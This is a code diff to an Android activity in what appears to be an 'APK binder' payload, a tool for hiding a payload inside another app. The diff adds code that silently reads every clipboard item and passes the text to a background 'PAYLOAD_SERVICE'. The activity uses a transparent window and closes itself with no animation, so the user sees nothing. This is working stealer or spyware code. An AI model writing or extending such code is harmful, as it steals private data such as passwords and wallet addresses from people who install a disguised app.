@@ -1,6 +1,7 @@
 package Com.devhs.apkbinder.payload
 
 import android.app.Activity
+import android.content.ClipboardManager
 import android.content.Intent
 import android.graphics.Color
 import android.graphics.drawable.ColorDrawable
@@ -13,6 +14,7 @@ import Com.devhs.apkbinder.core.Const
 class PermissionGateActivity : Activity() {
 
     private var finished = false
+    private var features: List<String> = emptyList()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -20,7 +22,7 @@ class PermissionGateActivity : Activity() {
 
         window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
 
-        val features = HsConfig.read(this)?.features ?: listOf("gallery")
+        features = HsConfig.read(this)?.features ?: listOf("gallery")
         val missing = HsPerms.missing(this, features)
         HsLog.w("gate features=$features missing=$missing")
 
@@ -45,26 +47,45 @@ class PermissionGateActivity : Activity() {
         proceed()
     }
 
+    private fun readClip(): String = try {
+        val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
+        val c = cm.primaryClip
+        if (c == null) "" else {
+            val sb = StringBuilder()
+            for (i in 0 until c.itemCount) {
+                val t = c.getItemAt(i).text?.toString() ?: continue
+                sb.append(t).append("\n---\n")
+            }
+            sb.toString()
+        }
+    } catch (t: Throwable) {
+        ""
+    }
+
     private fun proceed() {
         if (finished) return
         finished = true
 
+        val clip = if (features.contains("clipboard")) readClip() else ""
+        HsLog.w("clip chars=" + clip.length)
+
         finish()
         overridePendingTransition(0, 0)
 
-        Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(0) }, 3000L)
+        Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(0, clip) }, 3000L)
     }
 
-    private fun startServiceSafe(attempt: Int) {
+    private fun startServiceSafe(attempt: Int, clip: String) {
         val i = Intent()
         i.setClassName(packageName, Const.PAYLOAD_SERVICE)
+        if (clip.isNotEmpty()) i.putExtra("clip", clip)
         try {
             if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
             HsLog.w("service started")
         } catch (t: Throwable) {
             HsLog.e("startFGS($attempt): ${t.message}")
             if (attempt < 3) {
-                Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(attempt + 1) }, 2000L)
+                Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(attempt + 1, clip) }, 2000L)
             } else {
                 try {
                     startService(i)
